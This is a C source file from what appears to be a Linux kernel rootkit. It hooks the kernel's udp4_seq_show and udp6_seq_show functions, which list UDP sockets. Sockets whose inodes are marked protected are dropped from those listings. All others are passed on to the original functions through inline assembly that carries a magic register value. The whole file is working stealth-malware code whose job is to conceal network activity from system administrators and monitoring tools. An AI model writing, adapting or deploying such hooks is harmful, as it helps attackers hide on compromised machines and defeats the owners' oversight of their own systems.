#include "../inc/hook.h"
#include "../inc/cmds.h"
#include "../inc/util.h"

#include <net/sock.h>

void *_udp4_seq_show = NULL;
void *_udp6_seq_show = NULL;

asmlinkage int32_t h_udp4_seq_show(struct seq_file *seq, void *v){
  int32_t ret = 0;
  hfind(_udp4_seq_show, "udp4_seq_show");

  if(SEQ_START_TOKEN != v)
    debgf("current socket inode: %lu", inode_from_sock(v));
  
  if(is_inode_protected(inode_from_sock(v)))
    return 0;

  asm("mov %1, %%r15;"
      "mov %2, %%rdi;"
      "mov %3, %%rsi;"
      "call *%4;"
      "mov %%eax, %0"
      : "=m"(ret)
      : "i"(SHRK_MAGIC_R15), "r"(seq), "r"(v), "m"(_udp4_seq_show)
      : "%r15", "%rdi", "%rsi", "%rax");

  return ret;
}

asmlinkage int32_t h_udp6_seq_show(struct seq_file *seq, void *v){
  int32_t ret = 0;
  hfind(_udp6_seq_show, "udp6_seq_show");

  if(SEQ_START_TOKEN != v)
    debgf("current socket inode: %lu", inode_from_sock(v));

  if(is_inode_protected(inode_from_sock(v)))
    return 0;

  asm("mov %1, %%r15;"
      "mov %2, %%rdi;"
      "mov %3, %%rsi;"
      "call *%4;"
      "mov %%eax, %0"
      : "=m"(ret)
      : "i"(SHRK_MAGIC_R15), "r"(seq), "r"(v), "m"(_udp6_seq_show)
      : "%r15", "%rdi", "%rsi", "%rax");

  return ret;
}
